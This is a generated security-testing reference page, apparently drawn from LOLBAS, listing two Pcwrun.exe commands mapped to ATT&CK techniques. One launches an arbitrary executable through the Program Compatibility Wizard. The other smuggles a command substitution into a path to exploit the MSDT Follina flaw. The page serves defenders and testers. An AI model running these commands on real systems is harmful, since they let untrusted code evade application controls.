---
parsed_by: focuslocust
source: commands
type: generated
---
# Pcwrun Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Pcwrun.exe

Tool page: [Pcwrun.exe](../../tools/windows/pcwrun.exe.md)

### Proxy execution of binary

```text
Pcwrun.exe {PATH_ABSOLUTE:.exe}
```

Description:

Open the target .EXE file with the Program Compatibility Wizard.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Pcwrun.yml` |
| Evidence | Command preserved from source parser. |

### Proxy execution of binary

```text
Pcwrun.exe /../../$(calc).exe
```

Description:

Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary commands and binaries. Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.

Related ATT&CK:

- [T1202](../../attack/techniques/T1202-indirect-command-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Pcwrun.yml` |
| Evidence | Command preserved from source parser. |
